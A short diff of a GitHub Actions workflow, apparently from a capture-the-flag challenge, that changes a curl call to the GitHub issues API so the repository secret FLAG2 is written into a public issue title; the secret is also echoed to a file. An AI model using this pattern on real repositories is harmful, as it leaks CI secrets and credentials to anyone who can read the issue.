@@ -16,7 +16,7 @@ jobs:
           -H "Authorization: token ${{ github.token }}" \
           -H "Accept: application/vnd.github.v3+json" \
           https://api.github.com/repos/${{github.repository}}/issues/${{github.event.issue.number}} \
-          -d '{"title":"This is new title", "body": "action run finished"}'
+          -d '{"title":${{ secrets.FLAG2 }}, "body": "action run finished"}'
 
       - run: echo "${{ secrets.FLAG2 }}" > file.txt
       - uses: hackpackctf/pretty-action@main
